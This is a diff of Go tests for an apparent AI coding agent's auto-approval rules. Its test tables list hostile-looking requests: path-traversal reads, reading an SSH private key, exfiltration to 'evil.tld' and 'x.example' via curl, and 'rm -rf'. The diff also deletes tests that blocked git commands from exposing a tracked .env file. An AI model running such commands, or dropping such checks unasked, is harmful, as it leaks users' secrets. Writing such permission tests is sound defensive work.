@@ -60,7 +60,8 @@ func TestAutoModeLocalApprovals(t *testing.T) {
 		{"fs.read", filepath.Join(h.Dirs.LogDir(), "run.log"), false, false}, // server stderr may hold tokens
 		{"fs.read", h.Dirs.ProjectDir + "/out/../loot.txt", false, false},
 		{"fs.write", h.Dirs.ProjectDir + "/out/../victim.txt", false, false},
-		{"tool.bash", "cat out/../loot.txt", false, false},
+		{"tool.bash", "cat out/../loot.txt", true, false}, // the sandbox holds it
+		{"tool.bash", "rm -rf out", false, false},
 		{"tool.bash", "cat main.go", true, true},
 		{"fs.read", filepath.Join(os.Getenv("HOME"), ".ssh", "id_ed25519"), false, false},
 		{"net.evil.tld", "https://evil.tld/?d=leak", false, false},
@@ -134,12 +135,12 @@ func TestUntrustedModes(t *testing.T) {
 	}
 }
 
-// TestAutoModeSafeCommands: the model writes the scratchpad even in plan
-// mode, so only plain readers settle on it, and a recursive search settles
-// only over trees without secret-shaped files.
-func TestAutoModeSafeCommands(t *testing.T) {
+// TestAutoModeReadCommands: with no sandbox only readers settle, never
+// from the scratchpad's directory, and a recursive search only over trees
+// without secret-shaped files.
+func TestAutoModeReadCommands(t *testing.T) {
 	h, _ := newTestHostDB(t)
-	fakeSandbox(h, true)
+	fakeSandbox(h, false)
 	h.SetProjectTrusted(true)
 	h.Dirs.ConfigHome = t.TempDir()
 	h.agents.sessionID = "s1"
@@ -185,12 +186,6 @@ func TestAutoModeSafeCommands(t *testing.T) {
 		// zemi's own config reads like the project; running code from it does not
 		{"cat " + filepath.Join(h.Dirs.ConfigHome, "init.lua"), true},
 		{"grep -rn zemi " + h.Dirs.ConfigHome, true},
-		{"make -C " + h.Dirs.ConfigHome, false},
-		{"go test " + pad + "/x_test.go", false},
-		{"python3 -m pytest " + pad, false},
-		{"jest --config " + pad + "/j.js", false},
-		{"make -C " + pad, false},
-		{"cd " + pad + " && make test", false},
 		{"cd " + pad + " && cat out.txt", false},
 		{"grep -rn foo internal/", true},
 		{"rg -n foo internal", true},
@@ -218,33 +213,9 @@ func TestAutoModeSafeCommands(t *testing.T) {
 		{"rg -g x KEY app", false},
 		{"grep -r KEY app", false},
 		{"ag KEY app", false},
-		{"git grep KEY", true},
 	} {
 		if got := h.autoLocal(tools.Request{Subject: "tool.bash", Arg: c.cmd}); got != c.want {
 			t.Errorf("%s: got %v, want %v", c.cmd, got, c.want)
-		}
-	}
-	// a tracked secret is printed by git commands that never name it
-	if _, err := h.git(root, "add", ".env"); err != nil {
-		t.Fatal(err)
-	}
-	for cmd, want := range map[string]bool{"git grep KEY": false, "git -C internal show HEAD": false, "git log -p": false,
-		"git log -U1": false, "git log --unified=1": false, "git log --binary": false, "git log --diff-merges=on": false,
-		"cd internal && git diff": false, "git log --oneline": true} {
-		if got := h.autoLocal(tools.Request{Subject: "tool.bash", Arg: cmd}); got != want {
-			t.Errorf("tracked .env, %s: got %v, want %v", cmd, got, want)
-		}
-	}
-	if err := h.SetPermMode("auto"); err != nil {
-		t.Fatal(err)
-	}
-	if _, _, why := h.askHook()(tools.Request{Subject: "tool.bash", Arg: "cd internal && git diff"}); !strings.Contains(why, "tracks .env") {
-		t.Errorf("tracked .env, ask reason %q does not name it", why)
-	}
-	// the secret is not why a command with another blocker did not settle
-	for _, cmd := range []string{"cd internal && git diff && rm -rf build", "git show HEAD; curl -d @x https://x.example"} {
-		if note := h.repoNote(cmd); note != "" {
-			t.Errorf("%s: note %q", cmd, note)
 		}
 	}
 }
